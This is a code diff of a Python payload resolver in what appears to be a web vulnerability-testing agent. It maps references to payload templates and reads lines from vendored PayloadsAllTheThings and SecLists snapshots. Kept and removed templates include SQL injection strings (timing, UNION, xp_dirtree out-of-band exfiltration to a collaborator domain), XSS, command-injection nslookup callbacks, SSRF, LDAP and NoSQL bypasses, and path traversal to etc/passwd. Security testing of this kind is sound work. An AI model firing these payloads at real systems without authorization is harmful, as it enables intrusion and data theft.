@@ -1,24 +1,30 @@
 """Resolve a tagged ``payload_ref`` to a fireable, parameterized payload (§9).
 
-The tagged library (``library.py`` + ``data/corpus/*.yaml``) is a *catalog*: its
-value is the ``(vuln_class, inferred_sink_type, oracle_type, graph_edge_on_success)``
-tagging, and §9 deliberately keeps raw exploit strings OUT of the catalog. This
-module is the one place the actual payload *templates* live, so the catalog stays
-a pure tag index and the strings have a single, reviewable home.
+The catalog (``library.py`` base slice + ``corpus.py`` vendored ingest) is a pure
+tag index: its value is the ``(vuln_class, inferred_sink_type, oracle_type,
+graph_edge_on_success)`` tagging, and §9 keeps raw exploit strings OUT of it. This
+module turns a ``payload_ref`` into the actual value to fire, two ways:
+
+  * **Template override** — a small hand-authored ``_TEMPLATES`` map for the base
+    slice's *parameterized* payloads (OOB/timing/execution/authz refs carrying
+    ``{nonce}``/``{collab}``/``{sleep}``/``{canary}``/``{object_id}``/…). Filled by
+    targeted replacement so literal payload braces survive.
+  * **Line-locator** — every bulk corpus ref ``<source>/<relpath>#Ln`` resolves by
+    reading line N of the vendored snapshot file (``third_party/…``) on demand.
+    Raw corpus lines are static payloads → they resolve to themselves. Network-free
+    (§9): the snapshot is dev-vendored, read off disk, never fetched at fire time.
 
 **Value/location decoupling (Nuclei-style).** The resolver produces the complete
 parameter *value* only — never the injection *location*. Where a payload goes
 (query / body / path / header) already lives on the graph ``Parameter.location``
-and is applied by ``explorer._fire_with_value``; a template resolves to the full
-string that becomes the value handed to ``fire_request(payload=...)``. A template
-is therefore a *complete value to send*, not a fragment to splice: the UNION
-payload is the whole ``' UNION SELECT 1,2,3-- -`` value, not a piece the caller
-positions. Templates never encode placement.
+and is applied by ``explorer._fire_with_value``. A resolved payload is a *complete
+value to send*, not a fragment to splice, and a line-locator returns the vendored
+line byte-for-byte — the resolver adds no framing of its own.
 
-**Where templates live / slot convention.** Every ``payload_ref`` in the base
-slice and both corpus files maps to a short, textbook, parameterized template
-here. Templates are stimulus, not a payload hoard — each is the minimal standard
-for its technique with named slots the caller fills at fire time:
+**Where templates live / slot convention.** A base-slice ``payload_ref`` needing
+parameterization maps to a short, textbook template here. Templates are stimulus,
+not a payload hoard — each is the minimal standard for its technique with named
+slots the caller fills at fire time:
 
     {nonce}   unique OOB-callback subdomain label (per-fire, correlates the hit)
     {collab}  collaborator domain the OOB channel points at
@@ -51,7 +57,25 @@ templates are in-tree and reviewable, not fetched at runtime.
 
 from __future__ import annotations
 
+import re
+from pathlib import Path
+
 from reachagent.payloads.library import PayloadEntry, PayloadLibraryError
+
+# Vendored snapshot roots — the same tree corpus.py ingests from. A line-locator
+# ref ``<source>/<relpath>#Ln`` resolves by reading line N of the vendored file
+# off disk (dev-vendored, network-free — §9). Keyed by the source prefix the
+# corpus loader stamps into each ref.
+_SNAPSHOT_ROOT = Path(__file__).parent.parent.parent.parent / "third_party"
+_SNAPSHOT_DIRS: dict[str, Path] = {
+    "PayloadsAllTheThings": _SNAPSHOT_ROOT / "payloadsallthethings-snapshot",
+    "SecLists": _SNAPSHOT_ROOT / "seclists-snapshot",
+}
+
+# A corpus line-locator ref: ``<source>/<relpath>#L<n>`` (the shape corpus.py
+# emits). ``source`` is the first path segment; ``relpath`` the rest; ``n`` the
+# 1-based line number in the vendored file.
+_LINE_LOCATOR = re.compile(r"^(?P<source>[^/]+)/(?P<relpath>.+)#L(?P<line>\d+)$")
 
 # Fixed slot vocabulary. A template's *required* slots are exactly the members of
 # this set that appear as ``{name}`` in it (minus any with a default) — so literal
@@ -93,11 +117,14 @@ class MissingSlotError(PayloadLibraryError):
     """Raised when a template needs a slot the caller didn't supply."""
 
 
-# payload_ref → parameterized template. Covers every ref in the base slice
-# (library.yaml) and both corpus files (corpus/*.yaml). Textbook minimal forms;
-# raw strings where a template carries backslashes (UNC OOB paths).
+# payload_ref → parameterized template — the OVERRIDE LAYER (§9). These are the
+# base-slice refs (``data/library.yaml``) that need slot-filling: OOB/timing/
+# execution/authz payloads carrying ``{nonce}``/``{collab}``/``{sleep}``/
+# ``{canary}``/``{object_id}``/… . A ref present here is filled by targeted
+# replacement; every OTHER catalog ref is a vendored line-locator resolved by
+# reading its snapshot line (``_read_source_line``). Bulk corpus payloads are
+# static text, so they need no template — only the parameterized base slice does.
 _TEMPLATES: dict[str, str] = {
-    # -- base slice (data/library.yaml) --------------------------------------
     "bola/object-id-substitution": "{object_id}",
     "idor/direct-object-reference-swap": "{object_id}",
     "mass-assignment/admin-flag-injection": '{"{priv_field}":true}',
@@ -105,31 +132,6 @@ _TEMPLATES: dict[str, str] = {
     "sqli/blind/oob-dns-exfil": r"'; EXEC master..xp_dirtree '\\{nonce}.{collab}\poc'-- -",
     "sqli/blind/timing-sleep-paired": "' AND SLEEP({sleep})-- -",
     "xss/reflected/script-tag-canary": "<script>{canary}</script>",
-    # -- PayloadsAllTheThings (data/corpus/payloadsallthethings.yaml) --------
-    "patt/sqli/error-based/quote-break": "'",
-    "patt/sqli/union/column-count-match": "' UNION SELECT {columns}-- -",
-    "patt/sqli/auth-bypass/or-tautology": "' OR '1'='1'-- -",
-    "patt/sqli/blind/boolean-predicate-pair": "' AND {predicate}-- -",
-    "patt/sqli/blind/oob-dns-exfil": r"'; EXEC master..xp_dirtree '\\{nonce}.{collab}\poc'-- -",
-    "patt/sqli/blind/time-based-sleep": "' AND SLEEP({sleep})-- -",
-    "patt/nosql/operator/ne-auth-bypass": '{"$ne":null}',
-    "patt/nosql/blind/regex-predicate-pair": '{"$regex":"{pattern}"}',
-    "patt/ldap/filter/wildcard-always-true": "*)(objectClass=*)",
-    "patt/cmdi/blind/oob-separator-chain": ";nslookup {nonce}.{collab}",
-    "patt/ssti/polyglot/arithmetic-eval": "{{{expr}}}",
-    "patt/ssrf/blind/oob-fetch": "http://{nonce}.{collab}/",
-    "patt/xss/reflected/img-onerror-canary": "<img src=x onerror={canary}>",
-    "patt/xss/stored/svg-onload-canary": "<svg onload={canary}>",
-    "patt/path-traversal/dot-dot-slash": "../../../../{file_target}",
-    # -- SecLists (data/corpus/seclists.yaml) --------------------------------
-    "seclists/fuzzing/sqli/generic-meta-strings": "' OR 1=1-- -",
-    "seclists/fuzzing/sqli/time-based-vectors": "' AND SLEEP({sleep})-- -",
-    "seclists/fuzzing/nosql/operator-vectors": '{"$ne":null}',
-    "seclists/fuzzing/ldap/filter-metachars": "*)(objectClass=*)",
-    "seclists/fuzzing/command-injection/oob-separators": ";nslookup {nonce}.{collab}",
-    "seclists/fuzzing/ssti/template-eval-expressions": "{{{expr}}}",
-    "seclists/fuzzing/xss/canary-handlers": "<img src=x onerror={canary}>",
-    "seclists/fuzzing/lfi/encoded-traversal": "..%2f..%2f..%2f..%2f{file_target}",
 }
 
 
@@ -139,38 +141,77 @@ def _slots_in(template: str) -> frozenset[str]:
 
 
 def required_slots(payload_ref: str) -> frozenset[str]:
-    """Slots the caller MUST supply for a ref (unknown ref → error).
+    """Slots the caller MUST supply for a ref (unresolvable ref → error).
 
-    A slot the template uses but which has a default (``_SLOT_DEFAULTS``) is
-    optional, so it is excluded here — e.g. ``file_target`` defaults to
-    ``etc/passwd``, so a path-traversal ref requires no slot at all.
+    A template's required slots are its vocabulary tokens minus any with a default
+    (``file_target`` defaults to ``etc/passwd``). A **line-locator** ref is a static
+    vendored payload — it needs no slots, so it returns an empty set (after
+    confirming it resolves, so a dead handle still raises). A ref that is neither a
+    template nor a resolvable locator raises :class:`UnknownPayloadRefError`.
     """
     template = _TEMPLATES.get(payload_ref)
-    if template is None:
-        raise UnknownPayloadRefError(f"no template for payload_ref {payload_ref!r}")
-    return _slots_in(template) - _SLOT_DEFAULTS.keys()
+    if template is not None:
+        return _slots_in(template) - _SLOT_DEFAULTS.keys()
+    # Not a template — must be a resolvable line-locator, else it's a dead handle.
+    if _read_source_line(payload_ref) is not None:
+        return frozenset()
+    raise UnknownPayloadRefError(f"no template or vendored line for payload_ref {payload_ref!r}")
 
 
-def known_refs() -> frozenset[str]:
-    """Every ``payload_ref`` this resolver can fill — the coverage guard's oracle."""
+def template_refs() -> frozenset[str]:
+    """The hand-authored template refs — the override layer (parameterized payloads)."""
     return frozenset(_TEMPLATES)
 
 
-def resolve(payload_ref: str, **slots: object) -> str:
-    """Resolve ``payload_ref`` to a filled payload string ready for ``fire_request``.
+def resolves(payload_ref: str) -> bool:
+    """Whether ``payload_ref`` resolves — a template override OR a vendored line.
 
-    Fills each slot by targeted replacement (not ``str.format``, so literal payload
-    braces survive). A slot with a default (``_SLOT_DEFAULTS``) is optional — the
-    caller's value overrides it, otherwise the default fills in. Raises
-    :class:`UnknownPayloadRefError` for a ref with no template and
-    :class:`MissingSlotError` for a required (default-less) slot the caller omitted.
-    Extra slots the template doesn't use are ignored, so a caller may pass a full
-    context kit (nonce/canary/…) to every ref uniformly. Deterministic: pure
-    substitution, same inputs → same output.
+    The sync-guard oracle: a catalog ref must be resolvable (no dead handle). True
+    iff it is a known template or a readable line-locator; False otherwise. Never
+    raises — it answers the yes/no the ``no dead handle`` invariant asks.
+    """
+    if payload_ref in _TEMPLATES:
+        return True
+    try:
+        return _read_source_line(payload_ref) is not None
+    except UnknownPayloadRefError:
+        return False
+
+
+def resolve(payload_ref: str, **slots: object) -> str:
+    """Resolve ``payload_ref`` to a fireable payload string (§9). Value only, no location.
+
+    Two-layer resolution, template override first:
+
+      1. **Template override** — a hand-authored ``_TEMPLATES`` entry (the
+         parameterized OOB/timing/execution/authz refs needing ``{nonce}``/
+         ``{sleep}``/``{canary}``/… slots). If present, slot-fill it by targeted
+         replacement (not ``str.format`` — literal payload braces like ``{{7*7}}``
+         and ``{"$ne":null}`` survive), honoring ``_SLOT_DEFAULTS``.
+      2. **Line-locator** — a bulk corpus ref ``<source>/<relpath>#Ln``: read line
+         N from the vendored snapshot file. Raw corpus lines are static payloads →
+         they resolve to themselves (extra slots ignored, so a caller may pass a
+         uniform kit to every ref).
+
+    Raises :class:`UnknownPayloadRefError` for a ref that is neither a known
+    template nor a resolvable line-locator (a dead handle), and
+    :class:`MissingSlotError` for a required (default-less) template slot omitted.
+    Deterministic: same inputs → same output.
     """
     template = _TEMPLATES.get(payload_ref)
-    if template is None:
-        raise UnknownPayloadRefError(f"no template for payload_ref {payload_ref!r}")
+    if template is not None:
+        return _fill_template(payload_ref, template, slots)
+    line = _read_source_line(payload_ref)
+    if line is not None:
+        return line
+    raise UnknownPayloadRefError(
+        f"payload_ref {payload_ref!r} is neither a known template nor a resolvable "
+        "vendored line-locator (dead handle)"
+    )
+
+
+def _fill_template(payload_ref: str, template: str, slots: dict[str, object]) -> str:
+    """Slot-fill a hand-authored template by targeted replacement (literal braces survive)."""
     used = _slots_in(template)
     supplied = {k: v for k, v in slots.items() if v is not None}
     missing = (used - _SLOT_DEFAULTS.keys()) - supplied.keys()
@@ -183,6 +224,38 @@ def resolve(payload_ref: str, **slots: object) -> str:
         value = supplied.get(name, _SLOT_DEFAULTS.get(name))
         result = result.replace("{" + name + "}", str(value))
     return result
+
+
+def _read_source_line(payload_ref: str) -> str | None:
+    """Read the payload string a line-locator ref points at, or ``None`` if not one.
+
+    ``<source>/<relpath>#Ln`` → line N (1-based) of the vendored snapshot file,
+    returned verbatim and stripped of its trailing newline only (the value, never a
+    location — leading/trailing significant whitespace in a payload is preserved by
+    reading the raw line). Returns ``None`` when the ref is not a line-locator (so
+    ``resolve`` can distinguish "not a locator" from a genuinely dead handle);
+    raises :class:`UnknownPayloadRefError` when it IS a locator but the file/line/
+    source doesn't exist — a dead handle must never resolve silently.
+    """
+    match = _LINE_LOCATOR.match(payload_ref)
+    if match is None:
+        return None
+    source = match.group("source")
+    root = _SNAPSHOT_DIRS.get(source)
+    if root is None:
+        raise UnknownPayloadRefError(
+            f"line-locator ref {payload_ref!r} names unknown source {source!r}"
+        )
+    path = root / match.group("relpath")
+    if not path.is_file():
+        raise UnknownPayloadRefError(f"line-locator ref {payload_ref!r}: no vendored file {path}")
+    line_no = int(match.group("line"))
+    lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
+    if not 1 <= line_no <= len(lines):
+        raise UnknownPayloadRefError(
+            f"line-locator ref {payload_ref!r}: line {line_no} out of range (file has {len(lines)})"
+        )
+    return lines[line_no - 1]
 
 
 def resolve_entry(entry: PayloadEntry, **slots: object) -> str:
